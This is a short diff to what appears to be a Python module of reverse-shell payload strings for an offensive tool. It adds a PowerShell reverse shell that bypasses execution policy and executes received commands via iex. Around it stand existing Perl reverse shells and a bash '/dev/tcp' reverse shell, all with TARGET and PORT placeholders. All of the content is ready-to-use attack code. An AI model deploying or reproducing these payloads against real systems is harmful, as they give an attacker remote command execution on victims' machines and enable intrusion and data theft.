@@ -13,3 +13,5 @@ REV_PERL_TCP = """perl -e "use Socket;\$i='TARGET';\$p=PORT;socket(S,PF_INET,SOC
 REV_PERL_TCP_2 = """perl -MIO -e "\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,'TARGET:PORT');STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;" """
 
 BASH_TCP = """/bin/bash -i >& /dev/tcp/TARGET/PORT 0>&1"""
+
+REV_POWERSHELL_TCP="""powershell -nop -ExecutionPolicy Bypass -Command '$client = New-Object System.Net.Sockets.TCPClient("TARGET",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = "$($sendback) PS $((pwd).Path) > ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' """
